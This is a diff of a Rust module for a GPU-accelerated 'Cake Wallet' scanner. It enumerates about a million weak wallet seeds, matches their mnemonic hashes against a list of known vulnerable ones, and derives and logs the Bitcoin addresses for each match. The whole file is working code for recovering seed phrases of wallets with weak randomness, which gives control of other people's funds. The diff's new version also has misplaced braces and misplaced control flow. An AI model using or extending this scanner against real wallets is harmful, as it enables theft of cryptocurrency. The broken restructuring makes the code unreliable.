@@ -1,20 +1,14 @@
 #[cfg(feature = "gpu")]
 use crate::scans::gpu_solver::GpuSolver;
 use anyhow::Result;
+use bip39::Mnemonic;
+use bitcoin::hashes::{Hash, HashEngine};
+use bitcoin::{Address, Network, CompressedPublicKey};
+use hex;
+use sha2::{Digest, Sha256};
 use std::collections::HashSet;
 use std::fs;
-use tracing::info;
-
-#[cfg(feature = "gpu")]
-use bip39::Mnemonic;
-#[cfg(feature = "gpu")]
-use bitcoin::{Address, CompressedPublicKey, Network};
-#[cfg(feature = "gpu")]
-use hex;
-#[cfg(feature = "gpu")]
-use sha2::{Digest, Sha256};
-#[cfg(feature = "gpu")]
-use tracing::warn;
+use tracing::{info, warn};
 
 /// Cake Wallet Targeted Scanner
 /// Validates official vulnerable mnemonic hashes against generated seeds
@@ -24,58 +18,35 @@ pub fn run_targeted() -> Result<()> {
     info!("Loading official vulnerable mnemonic hashes...");
 
     // Load vulnerable hashes
-    let hashes_file =
-        fs::read_to_string("cakewallet_vulnerable_hashes.txt").unwrap_or_else(|_| "".to_string());
-
+    let hashes_file = fs::read_to_string("cakewallet_vulnerable_hashes.txt")
+        .unwrap_or_else(|_| "".to_string());
+        
     let vulnerable_hashes: HashSet<String> = hashes_file
         .lines()
         .map(|line| line.trim().to_lowercase())
         .filter(|line| !line.is_empty())
         .collect();
 
-    info!(
-        "Loaded {} vulnerable mnemonic hashes",
-        vulnerable_hashes.len()
-    );
+    info!("Loaded {} vulnerable mnemonic hashes", vulnerable_hashes.len());
     info!("Initializing GPU Solver...");
 
     #[cfg(not(feature = "gpu"))]
     {
-        anyhow::bail!(
-            "This scanner requires GPU acceleration. Please recompile with --features gpu"
-        );
+        anyhow::bail!("This scanner requires GPU acceleration. Please recompile with --features gpu");
     }
 
     #[cfg(feature = "gpu")]
+    let solver = GpuSolver::new()?;
+
+    #[cfg(feature = "gpu")]
     {
-        // Note: CakeWallet profile includes both cake_hash and batch_cake_full kernels.
-        // Large lookup tables (BIP39 wordlist, secp256k1 precomputation) have been moved
-        // from constant memory to global memory to avoid the 64KB constant memory limit.
-        // The kernels should now compile on all standard GPUs, but very large kernel sizes
-        // may still occasionally cause issues on some older or resource-constrained GPUs
-        // due to factors like register pressure or compilation timeouts.
-        #[allow(deprecated)]
-        let solver = match GpuSolver::new_with_profile(
-            crate::scans::gpu_solver::KernelProfile::CakeWallet,
-        ) {
-            Ok(s) => s,
-            Err(e) => {
-                warn!("[GPU] Failed to initialize GPU solver: {}", e);
-                warn!("[GPU] This scanner requires GPU acceleration with cake_hash and batch_cake_full kernels");
-                warn!("[GPU] The large precomputation tables have been moved from constant to global memory");
-                warn!("[GPU] but kernel compilation may still fail on older or resource-constrained GPUs");
-                anyhow::bail!(
-                    "GPU initialization failed. The kernel may not be compatible with your GPU."
-                );
-            }
-        };
         let network = Network::Bitcoin;
 
         info!("Scanning 1,048,576 possible seeds...");
 
         let mut checked = 0;
         let mut found = 0;
-
+        
         // Batch for GPU processing: Store seed indices
         let mut batch: Vec<u32> = Vec::with_capacity(1024);
         // Store corresponding mnemonic info for logging
@@ -100,61 +71,58 @@ pub fn run_targeted() -> Result<()> {
                     found += 1;
                     batch.push(seed_index as u32);
                     batch_info.push((seed_index as u32, mnemonic_str.clone(), hash_hex.clone()));
-
-                    warn!(
-                        "[VULNERABLE] Seed Match #{}: {} -> Hash: {}",
-                        seed_index,
-                        &mnemonic_str[..30],
-                        &hash_hex[..16]
-                    );
+                    
+                    warn!("[VULNERABLE] Seed Match #{}: {} -> Hash: {}", 
+                         seed_index, &mnemonic_str[..30], &hash_hex[..16]);
                 }
             }
 
             checked += 1;
             if checked % 100_000 == 0 {
-                info!(
-                    "Progress: {:.1}% - Found: {}",
-                    (checked as f64 / 1_048_576.0) * 100.0,
-                    found
-                );
+                info!("Progress: {:.1}% - Found: {}", (checked as f64 / 1_048_576.0) * 100.0, found);
             }
 
             // Process Batch
             if batch.len() >= 1000 || (checked == 1_048_576 && !batch.is_empty()) {
                 // Send to GPU
                 let results = solver.compute_cake_batch_full(&batch)?;
-
-                // Process results
-                for (i, _seed_idx) in batch.iter().enumerate() {
-                    // Results are flat: 40 public keys per seed
-                    // Order: Change 0 (20 addrs), Change 1 (20 addrs)
-                    let base = i * 40;
-
-                    for change in 0..=1 {
-                        for idx in 0..20 {
-                            let key_idx = base + (change as usize * 20) + idx as usize;
-                            let pubkey_bytes = results[key_idx];
-
-                            // Create P2WPKH Address from Compressed Public Key (33 bytes)
-                            if let Ok(pubkey) = bitcoin::PublicKey::from_slice(&pubkey_bytes) {
-                                let compressed = CompressedPublicKey(pubkey.inner);
-                                let address = Address::p2wpkh(&compressed, network);
-                                warn!("  ADDRESS m/0'/{}/{}: {}", change, idx, address);
-                            } else {
-                                warn!("  ADDRESS m/0'/{}/{}: Invalid Pubkey from GPU", change, idx);
-                            }
+            
+            // Process results
+            for (i, _seed_idx) in batch.iter().enumerate() {
+                // Results are flat: 40 public keys per seed
+                // Order: Change 0 (20 addrs), Change 1 (20 addrs)
+                let base = i * 40;
+                
+                for change in 0..=1 {
+                    for idx in 0..20 {
+                        let key_idx = base + (change as usize * 20) + idx as usize;
+                        let pubkey_bytes = results[key_idx];
+                        
+                        // Create P2WPKH Address from Compressed Public Key (33 bytes)
+                        if let Ok(pubkey) = bitcoin::PublicKey::from_slice(&pubkey_bytes) {
+                             let compressed = CompressedPublicKey(pubkey.inner);
+                             let address = Address::p2wpkh(&compressed, network);
+                             warn!("  ADDRESS m/0'/{}/{}: {}", change, idx, address);
+                        } else {
+                             warn!("  ADDRESS m/0'/{}/{}: Invalid Pubkey from GPU", change, idx);
                         }
                     }
                 }
-
-                batch.clear();
-                batch_info.clear();
             }
+            
+            batch.clear();
+            batch_info.clear();
         }
+    }
 
         info!("\nScan complete!");
         info!("Total seeds checked: {}", checked);
         info!("Vulnerable seeds found: {}", found);
         Ok(())
+    }
+    
+    #[cfg(not(feature = "gpu"))]
+    {
+        unreachable!("GPU feature not enabled, should have returned earlier");
     }
 }
